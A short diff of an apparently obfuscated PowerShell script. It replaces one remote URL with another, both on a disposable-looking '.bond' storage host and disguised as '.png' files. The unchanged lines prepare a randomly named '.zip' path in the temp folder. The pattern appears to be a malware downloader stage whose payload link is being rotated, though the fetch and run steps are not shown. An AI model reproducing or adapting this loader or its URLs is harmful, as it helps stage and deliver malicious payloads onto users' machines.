@@ -1,4 +1,4 @@
-$GXjAo = "https://file.freestorage-04.bond/files/2026/10/5/cd2f3fb9-6c80-4243-9429-d54e87a931f6/haha.png?srl=II-DSBd1GW9Cp8UHWbh2NQ&exp=1791247315"
+$GXjAo = "https://file.freestorage-04.bond/files/2026/10/5/4b68e7a8-adee-47d1-bd85-4c22e06b1d48/zzz.png?srl=sSOsEtVrGmndjhVDdHNVKA&exp=1791248206"
 $yyAa = [System.IO.Path]::GetRandomFileName().Replace('.','')
 $mFiU = [System.IO.Path]::GetTempPath()
 $g0WvmJjG = Join-Path $mFiU ("$yyAa" + ".zip")
